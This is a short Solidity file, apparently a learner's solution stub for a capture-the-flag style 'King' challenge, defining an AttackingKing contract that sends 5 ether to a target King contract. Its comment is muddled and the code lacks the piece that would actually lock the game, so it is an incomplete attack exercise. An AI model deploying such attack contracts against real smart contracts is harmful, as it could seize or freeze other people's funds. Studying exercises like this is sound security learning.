// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Code me!
        // As long as the prize is >= 5eth, then we will 
        // make the payable function send it to this contractAddress 
        address(contractAddress).call{value: 5 ether}("");
    }
}
